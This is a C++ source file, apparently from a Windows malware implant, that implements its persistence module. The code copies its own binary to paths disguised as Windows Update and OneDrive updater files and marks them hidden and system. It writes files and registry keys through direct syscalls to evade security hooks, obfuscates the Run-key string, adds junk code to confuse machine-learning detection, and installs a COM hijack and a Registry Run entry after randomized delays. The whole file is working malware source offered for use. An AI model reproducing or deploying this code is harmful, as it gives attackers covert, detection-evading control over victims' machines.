#include "Persistence.h"
#include "ComHijacker.h"
#include "WmiPersistence.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include "../utils/ApiHasher.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../evasion/Detection.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <random>
#include <sstream>
#include <algorithm>

namespace persistence {

namespace {

// Junk code to change the binary's profile and confuse ML
void JunkLogic() {
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) {
        x += (i % 3) ? 1 : -1;
    }
    if (x > 100000) LOG_DEBUG("Junk branch");
}

struct PersistTarget {
    std::wstring path;
    std::wstring name;
};

// "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
std::wstring kRunKey = L"\x00\x31\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x3d\x37\x27\x3b\x23\x3b\x32\x20\x0e\x0e\x03\x3d\x3a\x30\x3b\x23\x27\x0e\x0e\x17\x21\x26\x26\x31\x3a\x20\x02\x31\x26\x27\x3d\x3b\x3a\x0e\x0e\x06\x21\x3a";

std::wstring getExecutablePath() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

PersistTarget getRandomTarget() {
    std::random_device rd;
    std::mt19937 gen(rd());
    bool isAdmin = utils::IsAdmin();
    std::vector<PersistTarget> targets;

    if (isAdmin) {
        wchar_t progData[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, progData);
        targets.push_back({std::wstring(progData) + L"\\Microsoft\\Windows\\Update\\winupdate.exe", L"WinUpdate"});
    } else {
        wchar_t localAppData[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", L"OneDriveUpdater"});
    }
    std::uniform_int_distribution<> dis(0, (int)targets.size() - 1);
    return targets[dis(gen)];
}

bool SetFileAttributesStealth(const std::wstring& path) {
    return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data) {
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
    DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
    if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;
    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)ntPath.c_str();
    uPath.Length = (USHORT)(ntPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status = InternalDoSyscall(ntCreateFileSsn, &hFile, (PVOID)(UINT_PTR)(FILE_GENERIC_WRITE | SYNCHRONIZE), &objAttr, &ioStatus, NULL, (PVOID)(UINT_PTR)FILE_ATTRIBUTE_NORMAL, 0, (PVOID)(UINT_PTR)FILE_OVERWRITE_IF, (PVOID)(UINT_PTR)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE), NULL, (PVOID)(UINT_PTR)0);
    if (!NT_SUCCESS(status)) return false;
    status = InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (PVOID)(UINT_PTR)(ULONG)data.size(), NULL, NULL, NULL, NULL);
    InternalDoSyscall(ntCloseSsn, hFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return NT_SUCCESS(status);
}

std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return {};
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
    std::vector<BYTE> buffer(size);
    DWORD read = 0;
    ReadFile(hFile, buffer.data(), size, &read, NULL);
    CloseHandle(hFile);
    return buffer;
}

bool InstallRegistryRun(const std::wstring& implantPath, const std::wstring& name) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring relativePath = utils::DecryptW(kRunKey);
    std::wstring hkcuPath = L"\\Registry\\User\\" + sid + L"\\" + relativePath;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING uName;
        uName.Buffer = (PWSTR)name.c_str();
        uName.Length = (USHORT)(name.length() * sizeof(wchar_t));
        uName.MaximumLength = uName.Length + sizeof(wchar_t);
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    return true;
}

void CreateDirectoryRecursive(const std::wstring& path) {
    size_t lastSlash = path.find_last_of(L"\\");
    if (lastSlash != std::wstring::npos) {
        std::wstring dirOnly = path.substr(0, lastSlash);
        std::wstring current;
        std::wstringstream ss(dirOnly);
        std::wstring segment;
        while (std::getline(ss, segment, L'\\')) {
            if (current.empty()) current = segment;
            else current += L"\\" + segment;
            CreateDirectoryW(current.c_str(), NULL);
        }
    }
}

} // namespace

bool establishPersistence(const std::wstring& overrideSourcePath) {
    JunkLogic();
    std::wstring sourcePath = overrideSourcePath.empty() ? getExecutablePath() : overrideSourcePath;
    PersistTarget target = getRandomTarget();

    if (lstrcmpiW(sourcePath.c_str(), target.path.c_str()) == 0) return false;

    // Create directory and copy binary
    CreateDirectoryRecursive(target.path);
    std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
    bool copied = false;
    if (!selfData.empty()) {
        std::wstring ntPersistPath = L"\\??\\" + target.path;
        copied = SyscallWriteFile(ntPersistPath, selfData);
    }
    if (!copied) copied = CopyFileW(sourcePath.c_str(), target.path.c_str(), FALSE) != 0;

    if (copied) {
        SetFileAttributesStealth(target.path);
    }

    // Only install 2 reliable methods, spaced out significantly
    Sleep(60000 + (GetTickCount() % 60000)); // 1-2 min delay

    // 1. COM Hijack (Very reliable/stealthy)
    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
    if (ComHijacker::Install(target.path, clsid)) {
        LOG_INFO("Persistence phase 1 set.");
    }

    Sleep(120000 + (GetTickCount() % 120000)); // 2-4 min delay

    // 2. Registry Run (User)
    if (InstallRegistryRun(target.path, target.name)) {
        LOG_INFO("Persistence phase 2 set.");
    }

    return true;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
